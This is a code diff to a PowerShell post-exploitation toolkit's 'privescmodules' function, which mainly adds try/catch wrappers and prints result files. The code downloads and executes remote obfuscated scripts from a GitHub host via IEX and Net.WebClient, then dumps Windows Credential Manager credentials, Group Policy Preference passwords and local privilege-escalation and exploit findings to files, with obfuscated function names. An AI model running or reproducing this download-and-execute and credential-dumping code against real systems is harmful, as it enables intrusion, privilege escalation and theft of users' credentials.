@@ -1279,26 +1279,36 @@ function privescmodules
     #Privilege Escalation Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
+    try{
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/locksher.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/UpPower.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/GPpass.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/AutoGP.ps1')
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
-
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')}
+    catch{}
     Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
     Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
+    if(Test-Path $currentPath\Exploitation\WCMCredentials.txt){ $out = Get-Content $currentPath\Exploitation\WCMCredentials.txt; $out}
 
     Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'
 
     Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
     amazon >> $currentPath\Vulnerabilities\GPP_Auto.txt
+    if(Test-Path $currentPath\Vulnerabilities\GPP_Auto.txt){ $out = Get-Content $currentPath\Vulnerabilities\GPP_Auto.txt; $out}
     Shockley >> $currentPath\Vulnerabilities\GPP_Passwords.txt
+    if(Test-Path $currentPath\Vulnerabilities\GPP_Passwords.txt){ $out = Get-Content $currentPath\Vulnerabilities\GPP_Passwords.txt; $out}
 
     Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
+    try{    
     families >> $currentPath\LocalPrivEsc\All_Localchecks.txt
+    $out = Get-Content $currentPath\LocalPrivEsc\All_Localchecks.txt; $out}
+    catch{}
 
     Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
+    try{
     proportioned >> $currentPath\Vulnerabilities\Sherlock_Vulns.txt
+    if(Test-Path $currentPath\Vulnerabilities\Sherlock_Vulns.txt){ $out = Get-Content $currentPath\Vulnerabilities\Sherlock_Vulns.txt; $out}}
+    catch{}
     
     $groups = 'Users,Everyone,Authenticated Users'
     $arguments = $groups.Split(",")
